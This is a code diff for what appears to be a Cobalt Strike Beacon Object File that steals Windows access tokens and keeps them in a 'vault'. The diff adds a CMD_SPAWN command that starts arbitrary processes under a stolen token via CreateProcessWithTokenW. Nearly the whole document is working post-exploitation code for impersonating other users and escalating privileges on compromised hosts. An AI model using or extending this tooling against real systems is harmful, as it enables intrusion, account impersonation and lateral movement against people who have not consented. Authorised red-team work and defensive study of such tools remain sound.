@@ -5,16 +5,21 @@
 // clang-format off
 WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
 DECLSPEC_IMPORT void WINAPI MSVCRT$free(void*);
+DECLSPEC_IMPORT void* WINAPI MSVCRT$memset(void*, int, size_t);
 WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
 WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
 DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
 DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
 DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
 DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
+DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CreateProcessWithTokenW(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+DECLSPEC_IMPORT WINBASEAPI int WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
 // clang-format on
 
 #define MAX_NAME 256
+//#define LOGON_WITH_PROFILE 1
+//#define LOGON_NETCREDENTIALS_ONLY 2
 
 #define CMD_CREATE 1
 #define CMD_STEAL 2
@@ -22,6 +27,7 @@ DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
 #define CMD_USE 4
 #define CMD_REMOVE 5
 #define CMD_REMOVE_ALL 6
+#define CMD_SPAWN 7
 
 struct vault_item {
     HANDLE token;
@@ -142,9 +148,28 @@ struct vault *BeaconDataVault(datap *parser) {
     // BeaconDataInt reads only 4-byte integer
     // Combine the address from two int
     uint64_t a1, a2;
-    a1 = BeaconDataInt(parser);
-    a2 = BeaconDataInt(parser);
+    a1 = (unsigned int) BeaconDataInt(parser);
+    a2 = (unsigned int) BeaconDataInt(parser);
     return (struct vault *)(a1 + (a2 << 32));
+}
+
+BOOL spawn_process(HANDLE token, DWORD logonType, wchar_t cmdline[]) {
+    //Init structs
+
+    STARTUPINFOW startupInfo;
+	PROCESS_INFORMATION processInformation;
+    
+    MSVCRT$memset(&startupInfo, 0, sizeof(STARTUPINFOW));
+	MSVCRT$memset(&processInformation, 0, sizeof(PROCESS_INFORMATION));
+
+    startupInfo.cb = sizeof(STARTUPINFOW);	
+
+    BeaconPrintf(CALLBACK_OUTPUT, "Trying to start process of type %d with cmd: %ls \n", logonType, cmdline);
+
+    // Returns value if success
+    BOOL status = ADVAPI32$CreateProcessWithTokenW(token, logonType, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);
+
+    return status;
 }
 
 void go(char *args, int len) {
@@ -215,5 +240,36 @@ void go(char *args, int len) {
         char *data = BeaconFormatToString(&obj, &len);
         BeaconOutput(CALLBACK_OUTPUT, data, len);
         BeaconFormatFree(&obj);
+    } else if (cmd == CMD_SPAWN) {
+        // (i) + ii + s + s + z
+        struct vault *vault = BeaconDataVault(&parser);
+        WORD pid = BeaconDataShort(&parser);
+        WORD logon = BeaconDataShort(&parser);
+
+        // I swear I've seen a BOF use wchar_t directly since pack allows for Z, but the extract func returns char* so wth?
+        char* cmdstr = BeaconDataExtract(&parser, NULL);
+        wchar_t cmd[MAX_NAME] = {0};
+        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, cmdstr, -1, cmd, MAX_NAME);
+        //toWideChar(cmdstr, cmd, MAX_NAME); This function doesn't seem to work, not sure why
+
+        // Get handle
+        BOOL status;
+        struct vault_item *item = vault_find(vault, pid);
+        if (item) {
+
+            status = spawn_process(item->token, logon, cmd);
+
+            if (status) {       
+                BeaconPrintf(CALLBACK_OUTPUT, "Successfully started process with cmd: %s\n", cmdstr);
+            } else {
+                BeaconPrintf(CALLBACK_ERROR, "Unable to start process with cmd: %s\n", cmdstr);
+            }
+
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "token of %i not in the vault; select or steal a valid token.\n", pid);
+            
+        }
+
+        
     }
 }
